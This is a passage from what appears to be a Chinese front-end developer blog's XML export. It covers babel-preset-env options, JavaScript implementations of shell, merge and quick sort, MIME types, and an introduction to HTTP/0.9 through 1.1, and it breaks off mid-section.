class="comment">//是否将ES6的模块化语法转译成其他类型</span></span><br><span class="line">             <span class="comment">//参数："amd" | "umd" | "systemjs" | "commonjs" | false，默认为'commonjs'</span></span><br><span class="line">            <span class="string">"modules"</span>: <span class="string">'commonjs'</span>,</span><br><span class="line">            <span class="comment">//是否进行debug操作，会在控制台打印出所有插件中的log，已经插件的版本</span></span><br><span class="line">            <span class="string">"debug"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="comment">//强制开启某些模块，默认为[]</span></span><br><span class="line">            <span class="string">"include"</span>: [<span class="string">"transform-es2015-arrow-functions"</span>],</span><br><span class="line">            <span class="comment">//禁用某些模块，默认为[]</span></span><br><span class="line">            <span class="string">"exclude"</span>: [<span class="string">"transform-es2015-for-of"</span>],</span><br><span class="line">            <span class="comment">//是否自动引入polyfill，开启此选项必须保证已经安装了babel-polyfill</span></span><br><span class="line">            <span class="comment">//参数：Boolean，默认为false.</span></span><br><span class="line">            <span class="string">"useBuiltIns"</span>: <span class="literal">false</span></span><br><span class="line">        &#125;]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>关于最后一个参数<code>useBuiltIns</code>，有两点必须要注意：</p>
<ul>
<li>1、如果<code>useBuiltIns</code>为true，项目中必须引入<code>babel-polyfill</code>。</li>
<li>2、<code>babel-polyfill</code>只能被引入一次，如果多次引入会造成全局作用域的冲突。</li>
</ul>
<p>做了个实验，同样的代码，只是<code>.babelrc</code>配置中一个开启了<code>useBuiltIns</code>，一个没有，两个js文件体积相差70K，<a href="https://github.com/Shenfq/studyBabel/tree/master/7-babel-env" target="_blank" rel="noopener">戳我看看</a>。</p>
<table>
<thead>
<tr>
<th>文件</th>
<th style="text-align:center">大小</th>
</tr>
</thead>
<tbody>
<tr>
<td>useBuiltIns.js</td>
<td style="text-align:center">189kb</td>
</tr>
<tr>
<td>notUseBuiltIns.js</td>
<td style="text-align:center">259kb</td>
</tr>
</tbody>
</table>
<p>最后啰嗦一句</p>
<p>关于polyfill还有个叫做<a href="https://polyfill.io/v2/docs/" target="_blank" rel="noopener">polyfill.io</a>的神器，只要在浏览器引入</p>
<blockquote>
<p><a href="https://cdn.polyfill.io/v2/polyfill.js" target="_blank" rel="noopener">https://cdn.polyfill.io/v2/po…</a></p>
</blockquote>
<p>服务器会更具浏览器的UserAgent返回对应的polyfill文件，很神奇，可以说这是目前最优雅的解决polyfill过大的方案。</p>
]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>工具配置</tag>
        <tag>babel</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-高级排序算法</title>
    <url>/2018/04/17/%E7%AE%97%E6%B3%95_%E9%AB%98%E7%BA%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="高级排序算法"><a href="#高级排序算法" class="headerlink" title="高级排序算法"></a>高级排序算法</h2><p>高级排序算法常用来处理大型的数据集合，这个数据集可达上百万个元素，而不是几百几千个。通过你需要排序的数据集合规模较小，建议使用基本排序算法处理，因为在小规模数据下使用高级排序算法，并不能起到优化的作用，有的时候甚至会由于算法本身的实现方式而拖慢速度，比如小规模数据使用快速排序算法性能反而不好。</p>
<h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><h5 id="算法简介"><a href="#算法简介" class="headerlink" title="算法简介"></a>算法简介</h5><p>希尔排序名字的来自于它的发明者：Donald Shell。希尔排序是对插入排序的改编版本，它和插入排序的不同在于，希尔排序会先比较离得较近的元素，而非相邻的元素，这在处理大规模数据的时候，能够使得元素更快的回到它应该出现的位置。</p>
<p class="tip">算法的平均时间复杂度为 O(nlog n)</p>

<h5 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h5><p>希尔排序的关键在于 <code>间隔序列</code>，这个间隔序列可以是事先指定好的，也可以是动态生成的。间隔序列的特点为，每个间隔序列的值依次递减且最后一个值必须为1，假设间隔序列为：<code>[g1, g2, g3, g4, ...., gk]</code>，那么有</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">g1 &gt; g2 &gt; g3 &gt; g4 &gt; ... &gt; gk</span><br></pre></td></tr></table></figure>
<p>且</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gk === <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>也可以动态生成间隔序列，动态生成间隔序列的算法是在《算法(第4版)》的合著者 <code>Robert Sedgewick</code> 提出的：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算后得到的 h 为间隔序列的最大值</span></span><br><span class="line"><span class="keyword">let</span> len = arr.length</span><br><span class="line"><span class="keyword">let</span> h = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (h &lt; len / <span class="number">3</span>) &#123;</span><br><span class="line">    h = h * <span class="number">3</span> + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 然后每趟间隔序列排序完成后，将 h 的值递减，直到 h 等于 1 为止，根据上面的生成算法，递减算法为：</span></span><br><span class="line">h = (h - <span class="number">1</span>) / <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>有了间隔序列之后，对数组依次使用间隔序列的值进行排序，而非像插入排序那样每次都从有序序列的后面逐个向前扫描，这样做的好处是可以使元素更快的出现在它应该在的“范围之内”，这个范围会随着间隔序列的值逐渐减小，直到当间隔序列值为 1 的时候，便会逐个比较，不过此时由于元素已经出现在离正确位置很近的位置，所以排序进行的会很快。</p>
<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellSort</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.length</span><br><span class="line">    <span class="keyword">var</span> g = <span class="number">1</span></span><br><span class="line">    <span class="comment">// 动态计算间隔序列</span></span><br><span class="line">    <span class="keyword">while</span> (g &lt; len / <span class="number">3</span>) &#123;</span><br><span class="line">        g = g * <span class="number">3</span> + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最后一趟比较的间隔应该为 1</span></span><br><span class="line">    <span class="keyword">while</span> (g &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 开始一趟以 g 为间隔的比较，初始化 i = g，且 i 逐渐累加到数组的最后一个元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = g; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="comment">// j 的初始化值为 i，j每次循环都会减少g，意味着：从第 i 个元素开始向前与相隔g个单位的元素进行比较。</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = i; j &gt;= g &amp;&amp; arr[j - g] &gt; arr[j]; j -= g) &#123;</span><br><span class="line">                <span class="keyword">var</span> temp = arr[j - g]</span><br><span class="line">                arr[j - g] = arr[j]</span><br><span class="line">                arr[j] = temp</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新间隔值</span></span><br><span class="line">        g = (g - <span class="number">1</span>) / <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><h5 id="算法简介-1"><a href="#算法简介-1" class="headerlink" title="算法简介"></a>算法简介</h5><p>归并排序的实现方式有两种，一种是自顶向下，另一种是子底向上。</p>
<p>归并排序是分治法的典型应用，他的名字来自与其排序的方式。</p>
<p class="tip">算法的平均时间复杂度为 O(nlog n)，空间复杂度为 O(n)</p>

<h5 id="算法描述-1"><a href="#算法描述-1" class="headerlink" title="算法描述"></a>算法描述</h5><h6 id="自顶向下"><a href="#自顶向下" class="headerlink" title="自顶向下"></a>自顶向下</h6><p>首先将长度为 <code>n</code> 的数组分成两个长度为 <code>n/2</code> 的子数组，然后将两个子数组递归的执行一分为二的操作，直到每个子数组中至多包含一个元素为止。由于这是一个递归的过程，当程序回溯的时候，将两个子数组进行排序合并，直到回溯完毕，此时排序完成，如下图：</p>
<p><img src="/static/img/zdxx.png" width="500"></p>
<p>上图描述了一个数组被递归拆分的过程，除此之外，在程序回溯的时候，一次保证数组有序，如下图：</p>
<p><img src="/static/img/hsyx.png" width="500"></p>
<h6 id="自顶向下的代码实现"><a href="#自顶向下的代码实现" class="headerlink" title="自顶向下的代码实现"></a>自顶向下的代码实现</h6><p>代码来自：<a href="https://github.com/damonare/Sorts" target="_blank" rel="noopener">https://github.com/damonare/Sorts</a>，并做了适当的修改和注释：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用的主要方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> len = arr.length</span><br><span class="line">    <span class="comment">// 递归结束的条件</span></span><br><span class="line">    <span class="keyword">if</span>(len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> arr</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对数组进行拆分，拆为 left 和 right</span></span><br><span class="line">    <span class="keyword">let</span> middle = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>),</span><br><span class="line">        left = arr.slice(<span class="number">0</span>, middle),</span><br><span class="line">        right = arr.slice(middle)</span><br><span class="line">    <span class="comment">// 递归调用，采用尾递归优化</span></span><br><span class="line">    <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// merge方法用来对两个数组进行排序，并返回排好序的数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span> (<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = []</span><br><span class="line">    <span class="comment">// 对两个子数组进行排序</span></span><br><span class="line">    <span class="keyword">while</span> (left.length &amp;&amp; right.length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]) &#123;</span><br><span class="line">            result.push(left.shift())</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.push(right.shift())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于两个子数组的元素个数不一定相等，所以在上一个while循环排序完成后，</span></span><br><span class="line">    <span class="comment">// 要检查left和right中是否还有元素，如果有则推入结果数组中</span></span><br><span class="line">    <span class="keyword">while</span> (left.length) &#123;</span><br><span class="line">        result.push(left.shift())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (right.length) &#123;</span><br><span class="line">        result.push(right.shift())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p>快速排序由于排序效率在同为O(N*logN)的几种排序方法中效率较高，因此经常被采用，再加上快速排序思想—-分治法也确实实用。快速排序是一种既不浪费空间又可以快一点的排序算法。</p>
<h5 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h5><ul>
<li>先从数列中取出一个数作为“基准”。</li>
<li>分区过程：将比这个“基准”大的数全放到“基准”的右边，小于或等于“基准”的数全放到“基准”的左边。</li>
<li>再对左右区间重复第二步，直到各区间只有一个数。</li>
</ul>
<p><img style="margin-left: 20px;" src="/static/img/3468915251-591982ece300e_articlex.gif" width="350"></p>
<h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> quickSort = <span class="function"><span class="keyword">function</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (arr.length &lt;= <span class="number">1</span>) &#123; <span class="keyword">return</span> arr; &#125;</span><br><span class="line">    <span class="keyword">var</span> pivotIndex = <span class="built_in">Math</span>.floor(arr.length / <span class="number">2</span>);   <span class="comment">//基准位置（理论上可任意选取）</span></span><br><span class="line">    <span class="keyword">var</span> pivot = arr.splice(pivotIndex, <span class="number">1</span>)[<span class="number">0</span>];  <span class="comment">//基准数</span></span><br><span class="line">    <span class="keyword">var</span> left = [];</span><br><span class="line">    <span class="keyword">var</span> right = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; pivot) &#123;</span><br><span class="line">            left.push(arr[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            right.push(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> quickSort(left).concat([pivot], quickSort(right));  <span class="comment">//链接左数组、基准数构成的数组、右数组</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>高级排序</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-MIME type</title>
    <url>/2018/04/17/%E7%BB%BC%E5%90%88_MIME-type/</url>
    <content><![CDATA[<h2 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h2><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p><code>MIME</code> 和 <code>MIME type</code> 并不是一个东西，<code>MIME</code> 的全称是 <code>Multipurpose Internet Mail Extensions</code>，它扩展了电子邮件标准，比如使得邮件支持非文本格式附件（二进制、声音、图像等）。后来 <code>HTTP</code> 协议也是用了 <code>MIME</code> 框架，使得 <code>MIME</code> 被扩展为 <code>互联网媒体类型(Internet media type)</code>，也就是 <code>MIME type</code>，或者叫 <code>MIME 类型</code>。</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type/subtype</span><br></pre></td></tr></table></figure>
<p>其中 <code>type</code> 是主要类型，可以是离散类型(<code>discrete type</code>) 或者 多部分类型(<code>multipart type</code>)。</p>
<p><code>discrete type</code> 包含有：<code>text</code>、<code>image</code>、<code>audio</code>、<code>video</code>、<code>application</code>。</p>
<p><code>subtype</code> 可以理解为每个主要类型(<code>type</code>)的子类型，或者具体类型。</p>
<p>举例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text/plain</span><br><span class="line">text/html</span><br><span class="line">image/jpeg</span><br><span class="line">image/png</span><br><span class="line">audio/mpeg</span><br><span class="line">audio/ogg</span><br><span class="line">audio/*</span><br><span class="line">video/mp4</span><br><span class="line">application/octet-stream</span><br><span class="line"></span><br><span class="line">multipart/form-data</span><br><span class="line">multipart/byteranges</span><br></pre></td></tr></table></figure>
<p>所有的 <code>MIME type</code> 可以看这里 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types" target="_blank" rel="noopener">MIME type 列表</a></p>
<h3 id="二、MIME-type-的作用"><a href="#二、MIME-type-的作用" class="headerlink" title="二、MIME type 的作用"></a>二、MIME type 的作用</h3><p>文件的扩展名在网络中是没有意义的，决定一个文件类型的就是 <code>MIME type</code>，在 <code>HTTP</code> 中就是响应头中的 <code>Content-Type</code>，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: text/HTML</span><br></pre></td></tr></table></figure>
<p>其中 <code>text/HTML</code> 就是一种 <code>MIME type</code>，表示内容是 <code>text/HTML</code> 类型，也就是超文本文件。</p>
<p>在使用表单空间选择文件时，我们常常需要限制用户所能够选择的文件，比如只允许用户选择 <code>Excel</code> 表格文件，我们可以这样写：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">accept</span>=<span class="string">"application/vnd.ms-excel, application/x-excel"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中 <code>application/vnd.ms-excel</code> 和 <code>application/x-excel</code> 就是两个 <code>MIME type</code>。</p>
]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>MIME</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-HTTP协议入门</title>
    <url>/2018/04/17/%E7%BB%BC%E5%90%88_HTTP%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="HTTP-协议入门"><a href="#HTTP-协议入门" class="headerlink" title="HTTP 协议入门"></a>HTTP 协议入门</h2><p>HTTP 协议是互联网的基础协议，也是网页开发的必备知识，最新版本 HTTP/2 更是让它成为技术热点。<br>本文介绍 HTTP 协议的历史演变和设计思路。</p>
<p>HTTP协议是<code>Hyper Text Transfer Protocol</code>（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。</p>
<p>HTTP是一个基于<code>TCP/IP</code>通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。</p>
<p><img src="/static/img/abcd.png"></p>
<h3 id="一、HTTP-0-9"><a href="#一、HTTP-0-9" class="headerlink" title="一、HTTP/0.9"></a>一、HTTP/0.9</h3><p>HTTP 是基于<code>TCP/IP</code>协议的应用层协议。它不涉及数据包（packet）传输，主要规定了客户端和服务器之间的通信格式，默认使用<code>80</code>端口。</p>
<p>最早版本是1991年发布的0.9版。该版本极其简单，只有一个命令GET。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /index.html</span><br></pre></td></tr></table></figure>
<p>上面命令表示，<code>TCP</code> 连接（connection）建立后，客户端向服务器请求（request）网页index.html。<br>协议规定，服务器只能回应HTML格式的字符串，不能回应别的格式。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务器发送完毕，就关闭TCP连接。</p>
<h3 id="二、HTTP-1-0"><a href="#二、HTTP-1-0" class="headerlink" title="二、HTTP/1.0"></a>二、HTTP/1.0</h3><h4 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h4><p>1996年5月，<code>HTTP/1.0</code> 版本发布，内容大大增加。</p>
<p>首先，任何格式的内容都可以发送。这使得互联网不仅可以传输文字，还能传输图像、视频、二进制文件。这为互联网的大发展奠定了基础。</p>
<p>其次，除了<code>GET</code>命令，还引入了<code>POST</code>命令和<code>HEAD</code>命令，丰富了浏览器与服务器的互动手段。</p>
<p>再次，HTTP请求和回应的格式也变了。除了数据部分，每次通信都必须包括头信息（<code>HTTP header</code>），用来描述一些元数据。</p>
<p>其他的新增功能还包括状态码（<code>status code</code>）、多字符集支持、多部分发送（<code>multi-part type</code>）、权限（<code>authorization</code>）、缓存（<code>cache</code>）、内容编码（<code>content encoding</code>）等。</p>
<h4 id="2-2-请求以及相应格式"><a href="#2-2-请求以及相应格式" class="headerlink" title="2.2 请求以及相应格式"></a>2.2 请求以及相应格式</h4><p>这个将在<code>HTTP/1.1</code>部分讲解</p>
<h4 id="2-3-缺点"><a href="#2-3-缺点" class="headerlink" title="2.3 缺点"></a>2.3 缺点</h4><p><code>HTTP/1.0</code> 版的主要缺点是，每个<code>TCP</code>连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。</p>
<p><code>TCP</code>连接的新建成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢（<code>slow start</code>）。所以，<code>HTTP 1.0</code>版本的性能比较差。随着网页加载的外部资源越来越多，这个问题就愈发突出了。</p>
<p>为了解决这个问题，有些浏览器在请求时，用了一个非标准的<code>Connection</code>字段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
<p>这个字段要求服务器不要关闭<code>TCP</code>连接，以便其他请求复用。服务器同样回应这个字段。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
<p>一个可以复用的<code>TCP</code>连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段，不同实现的行为可能不一致，因此不是根本的解决办法。</p>
<h3 id="三、HTTP-1-1"><a href="#三、HTTP-1-1" class="headerlink" title="三、HTTP/1.1"></a>三、HTTP/1.1</h3><p>1997年1月，HTTP/1.1 版本发布，只比 1.0 版本晚了半年。它进一步完善了 HTTP 协议，一直用到了20年后的今天，直到现在还是最流行的版本。</p>
<h4 id="3-1-请求格式"><a href="#3-1-请求格式" class="headerlink" title="3.1 请求格式"></a>3.1 请求格式</h4><p><code>GET</code>的例子<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /562f25980001b1b106000338.jpg HTTP/1.0</span><br><span class="line">Host:    img.mukewang.com</span><br><span class="line">User-Agent:    Mozilla/5.0 (Macintosh; Intel …) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept:    */*</span><br><span class="line">Accept-Language:   zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding:   gzip, deflate</span><br><span class="line">Referer:   http://fragment.firefoxchina.c…/baidu_main_page_250x250.html</span><br><span class="line">Cookie:    BAIDUID=F395366A0E9261C1F376BA…BAE2E839289B; PSTM=1494254264</span><br><span class="line">Connection:    keep-alive</span><br></pre></td></tr></table></figure></p>
<p><code>POST</code>的例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP1.1</span><br><span class="line">Host:www.wrox.com</span><br><span class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:40</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley</span><br></pre></td></tr></table></figure>
<p>第一部分是请求命令，必须在尾部添加协议版本（HTTP/1.1）。第二部分后面就是多行头信息，描述客户端的情况。第三部分：空行，即使第四部分没有请求的数据体，空行也要有。第四部分：请求数据。</p>
<h4 id="3-2-回应格式"><a href="#3-2-回应格式" class="headerlink" title="3.2 回应格式"></a>3.2 回应格式</h4><p>服务器的回应如下。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;Hello World&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>回应的格式是”头信息 + 一个空行（\r\n） + 数据”。其中，第一行是”协议版本 + 状态码（status code） + 状态描述”。</p>
<h4 id="3-3-Content-Type-字段"><a href="#3-3-Content-Type-字段" class="headerlink" title="3.3 Content-Type 字段"></a>3.3 Content-Type 字段</h4><p>关于字符的编码，1.0版规定，头信息必须是 ASCII 码，后面的数据可以是任何格式。因此，服务器回应的时候，必须告诉客户端，数据是什么格式，这就是Content-Type字段的作用。<br>下面是一些常见的Content-Type字段的值。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text/plain</span><br><span class="line">text/html</span><br><span class="line">text/css</span><br><span class="line">image/jpeg</span><br><span class="line">image/png</span><br><span class="line">image/svg+xml</span><br><span class="line">audio/mp4</span><br><span class="line">video/mp4</span><br><span class="line">application/javascript</span><br><span class="line">application/pdf</span><br><span class="line">application/zip</span><br><span class="line">application/atom+xml</span><br></pre></td></tr></table></figure></p>
<p>这些数据类型总称为<code>MIME type</code>，每个值包括一级类型和二级类型，之间用斜杠分隔。<br>除了预定义的类型，厂商也可以自定义类型。<a href="/note/specification/mime">MIME type 说明</a></p>
<p>application/vnd.debian.binary-package<br>上面的类型表明，发送的是Debian系统的二进制数据包。</p>
<p>MIME type还可以在尾部使用分号，添加参数。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure></p>
<p>上面的类型表明，发送的是网页，而且编码是UTF-8。</p>
<p>客户端请求的时候，可以使用Accept字段声明自己可以接受哪些数据格式。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept: */*</span><br></pre></td></tr></table></figure></p>
<p>上面代码中，客户端声明自己可以接受任何格式的数据。</p>
<h4 id="3-4-Content-Encoding-字段"><a href="#3-4-Content-Encoding-字段" class="headerlink" title="3.4 Content-Encoding 字段"></a>3.4 Content-Encoding 字段</h4><p>由于发送的数据可以是任何格式，因此可以把数据压缩后再发送。Content-Encoding字段说明数据的压缩方法。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure></p>
<p>客户端在请求时，用Accept-Encoding字段说明自己可以接受哪些压缩方法。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure></p>
<h4 id="3-5-1-0与1-1差异"><a href="#3-5-1-0与1-1差异" class="headerlink" title="3.5 1.0与1.1差异"></a>3.5 1.0与1.1差异</h4><h5 id="3-5-1-版的最大变化，就是引入了持久连接（persistent-connection），即TCP连接默认不关闭，可以被多个请求复用，不用声明Connection-keep-alive。"><a href="#3-5-1-版的最大变化，就是引入了持久连接（persistent-connection），即TCP连接默认不关闭，可以被多个请求复用，不用声明Connection-keep-alive。" class="headerlink" title="3.5.1 版的最大变化，就是引入了持久连接（persistent connection），即TCP连接默认不关闭，可以被多个请求复用，不用声明Connection: keep-alive。"></a>3.5.1 版的最大变化，就是引入了持久连接（persistent connection），即<code>TCP</code>连接默认不关闭，可以被多个请求复用，不用声明<code>Connection: keep-alive</code>。</h5><p>客户端和服务器发现对方一段时间没有活动，就可以主动关闭连接。不过，规范的做法是，客户端在最后一个请求时，发送<code>Connection: close</code>，明确要求服务器关闭<code>TCP</code>连接。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: close</span><br></pre></td></tr></table></figure></p>
<p>目前，对于同一个域名，大多数浏览器允许同时建立6个持久连接。</p>
<h5 id="3-5-2-管道机制"><a href="#3-5-2-管道机制" class="headerlink" title="3.5.2 管道机制"></a>3.5.2 管道机制</h5><p>1.1 版还引入了管道机制（pipelining），即在同一个<code>TCP</code>连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。</p>
<p>举例来说，客户端需要请求两个资源。以前的做法是，在同一个<code>TCP</code>连接里面，先发送A请求，然后等待服务器做出回应，收到后再发出B请求。管道机制则是允许浏览器同时发出A请求和B请求，但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。</p>
<h5 id="3-5-3-Content-Length-字段"><a href="#3-5-3-Content-Length-字段" class="headerlink" title="3.5.3 Content-Length 字段"></a>3.5.3 <code>Content-Length</code> 字段</h5><p>一个<code>TCP</code>连接现在可以传送多个回应，势必就要有一种机制，区分数据包是属于哪一个回应的。这就是<code>Content-length</code>字段的作用，声明本次回应的数据长度。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Length: 3495</span><br></pre></td></tr></table></figure></p>
<p>上面代码告诉浏览器，本次回应的长度是3495个字节，后面的字节就属于下一个回应了。</p>
<p>在1.0版中，<code>Content-Length</code>字段不是必需的，因为浏览器发现服务器关闭了<code>TCP</code>连接，就表明收到的数据包已经全了。</p>
<h5 id="3-5-4-分块传输编码"><a href="#3-5-4-分块传输编码" class="headerlink" title="3.5.4 分块传输编码"></a>3.5.4 分块传输编码</h5><p>使用<code>Content-Length</code>字段的前提条件是，服务器发送回应之前，必须知道回应的数据长度。</p>
<p>对于一些很耗时的动态操作来说，这意味着，服务器要等到所有操作完成，才能发送数据，显然这样的效率不高。更好的处理方法是，产生一块数据，就发送一块，采用”流模式”（stream）取代”缓存模式”（buffer）。</p>
<p>因此，1.1版规定可以不使用<code>Content-Length</code>字段，而使用”分块传输编码”（chunked transfer encoding）。只要请求或回应的头信息有Transfer-Encoding字段，就表明回应将由数量未定的数据块组成。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure></p>
<p>每个非空的数据块之前，会有一个16进制的数值，表示这个块的长度。最后是一个大小为0的块，就表示本次回应的数据发送完了。下面是一个例子。</p>
